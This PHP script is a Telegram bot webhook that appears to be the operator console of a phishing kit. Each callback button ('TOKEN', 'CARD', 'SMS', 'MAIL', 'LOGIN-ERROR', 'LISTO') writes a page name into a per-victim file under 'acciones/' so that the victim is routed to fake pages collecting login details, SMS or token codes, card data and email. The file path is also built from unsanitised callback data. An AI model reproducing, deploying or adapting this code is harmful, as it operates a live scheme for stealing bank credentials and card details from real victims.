<?php
$content = file_get_contents("php://input");
$update = json_decode($content, true);

require_once("settings.php");

$chat_id = $update["message"]["chat"]["id"] ?? ($update["callback_query"]["from"]["id"] ?? null);

if (isset($update["callback_query"])) {
    $callback_query_id = $update["callback_query"]["id"];
    $data = $update["callback_query"]["data"];
    list($accion, $usuario) = explode("|", $data);

    if ($accion === "TOKEN") {
        file_put_contents("acciones/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "➡️ Redirigido a SMS para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "TOKEN-ERROR") {
        file_put_contents("acciones/{$usuario}.txt", "tokenerror.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "❌ Redirigido a SMSERROR para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "LOGIN-ERROR") {
        file_put_contents("acciones/{$usuario}.txt", "loginerror.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "⚠️ Redirigido a LOGINERROR para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "CARD") {
        file_put_contents("acciones/{$usuario}.txt", "card.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "💳 Redirigido a CARD para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "LISTO") {
        file_put_contents("acciones/{$usuario}.txt", "listo.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "✅ Finalizado para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "SMSERROR") {
        file_put_contents("acciones/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "❌ Redirigido a TOKEN para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "MAIL") {
        file_put_contents("acciones/{$usuario}.txt", "mail.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "📧 Redirigido a MAIL para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "LOGIN") {
        file_put_contents("acciones/{$usuario}.txt", "index.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "🔁 Redirigido a LOGIN principal para $usuario",
            "show_alert" => false
        ]));
    } elseif ($accion === "SMS") {
        file_put_contents("acciones/{$usuario}.txt", "token.php");
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            "callback_query_id" => $callback_query_id,
            "text" => "📩 Redirigido a SMS para $usuario",
            "show_alert" => false
        ]));
    }
}
?>
